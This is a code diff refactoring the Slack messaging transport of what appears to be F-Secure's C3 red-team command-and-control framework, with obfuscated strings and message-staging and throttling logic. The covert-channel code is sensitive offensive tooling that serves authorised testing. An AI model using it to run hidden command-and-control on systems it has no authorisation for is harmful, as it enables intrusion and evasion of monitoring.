@@ -191,18 +191,7 @@ void FSecure::Slack::UpdateMessage(std::string const& message, std::string const
 
 void FSecure::Slack::WriteReply(std::string const& text, std::string const& timestamp)
 {
-	//this is more than 30 messages, send it as a file (we do this infrequently as file uploads restricted to 20 per minute).
-	//Using file upload for staging (~88 messages) is a huge improvement over sending actual replies.
-	if (text.length() >= 120000)
-	{
-		this->UploadFile(text, timestamp);
-		return;
-	}
-
-	if (text.length() > 40000) //hide how large messages are sent.
-	{
-		return this->WriteReplyLarge(text, timestamp);
-	}
+	assert(text.size() <= 40'000);
 
 	json j;
 	j[OBF("channel")] = this->m_Channel;
@@ -210,7 +199,7 @@ void FSecure::Slack::WriteReply(std::string const& text, std::string const& time
 	j[OBF("thread_ts")] = timestamp;
 	std::string url = OBF("https://slack.com/api/chat.postMessage");
 
-	json response = SendJsonRequest(url, j);
+	SendJsonRequest(url, j);
 }
 
 void FSecure::Slack::DeleteMessage(std::string const& timestamp)
@@ -220,32 +209,10 @@ void FSecure::Slack::DeleteMessage(std::string const& timestamp)
 	j[OBF("ts")] = timestamp;
 	std::string url = OBF("https://slack.com/api/chat.delete");
 
-	json response = SendJsonRequest(url, j);
-
+	SendJsonRequest(url, j);
 }
 
-//Slack limits a messages to 40000 characters - this actually gets split across 10 4000 character messages
-void FSecure::Slack::WriteReplyLarge(std::string const& data, std::string const& ts)
-{
-	std::string ret;
-	int start = 0;
-	int size = static_cast<int>(data.length());
-
-	//Write 40k character messages at a time
-	while (size > 40000)
-	{
-		this->WriteReply(data.substr(start, 40000), ts);
-		start += 40000;
-		size -= 40000;
-
-
-		std::this_thread::sleep_for(std::chrono::seconds(7)); //throttle our output so slack  blocks us less (40k characters is 10 messages)
-	}
-
-	this->WriteReply(data.substr(start, data.length()), ts); //write the final part of the payload
-}
-
-json FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, std::string const& data)
+std::string FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, std::string const& data)
 {
 	while (true)
 	{
@@ -265,15 +232,9 @@ json FSecure::Slack::SendHttpRequest(std::string const& host, std::string const&
 		web::http::http_response resp = webClient.request(request).get();
 
 		if (resp.status_code() == web::http::status_codes::OK)
-		{
-			auto respData = resp.extract_string().get();
-			return json::parse(respData);
-		}
+			return resp.extract_utf8string().get();
 		else if (resp.status_code() == web::http::status_codes::TooManyRequests)
-		{
-			//sleep between 10 and 20 seconds
 			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
-		}
 		else
 			throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
 	}
@@ -281,7 +242,7 @@ json FSecure::Slack::SendHttpRequest(std::string const& host, std::string const&
 
 json FSecure::Slack::SendJsonRequest(std::string const& url, json const& data)
 {
-	return SendHttpRequest(url, OBF("application/json"), data.dump());
+	return json::parse(SendHttpRequest(url, OBF("application/json"), data.dump()));
 }
 
 void FSecure::Slack::UploadFile(std::string const& data, std::string const& ts)
@@ -292,23 +253,11 @@ void FSecure::Slack::UploadFile(std::string const& data, std::string const& ts)
 
 	std::string toSend = OBF("filename=test5&content=") + encoded;
 
-	json response = SendHttpRequest(url, OBF("application/x-www-form-urlencoded"), toSend);
+	SendHttpRequest(url, OBF("application/x-www-form-urlencoded"), toSend);
 }
 
 
 std::string FSecure::Slack::GetFile(std::string const& url)
 {
-	std::string host = url;
-	std::string authHeader = OBF("Bearer ") + this->m_Token;
-
-	web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
-	web::http::http_request request;
-
-	request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
-
-	web::http::http_response response = webClient.request(request).get();
-	if (response.status_code() == web::http::status_codes::OK)
-		return response.extract_utf8string().get();
-	else
-		return {};
+	return SendHttpRequest(url, "", "");
 }
